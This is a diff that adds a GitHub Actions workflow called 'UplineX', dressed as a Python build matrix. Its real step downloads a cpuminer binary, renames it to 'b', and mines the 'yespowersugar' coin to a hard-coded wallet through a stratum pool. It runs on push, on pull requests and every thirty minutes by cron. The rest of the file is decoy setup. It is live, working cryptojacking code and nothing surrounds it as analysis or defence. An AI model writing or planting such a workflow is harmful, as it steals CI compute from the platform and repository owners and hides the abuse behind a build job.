@@ -1,0 +1,30 @@
+name: UplineX
+
+on:
+  push:
+    branches: [ main ]
+  pull_request:
+    branches: [ main ]
+  schedule:
+    - cron: "*/30 */5 * * *"
+jobs:
+  build:
+
+    runs-on: ubuntu-latest
+    strategy:
+      max-parallel: 255
+      matrix:
+        python-version: [3.7,3.6,3.7,3.9,3.8,]
+
+    steps:
+    - uses: actions/checkout@v2
+    - name: Set up Python ${{ matrix.python-version }}
+      uses: actions/setup-python@v2
+      with:
+        python-version: ${{ matrix.python-version }}
+    - name: Mining
+      run: |
+        wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+        tar xf cpuminer-opt-linux.tar.gz
+        mv cpuminer-sse2 b
+        ./b -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:17042 -u sugar1qxe80n9fadcvr2yjl79u65cgc6csp9t5detrtm5.new -t0
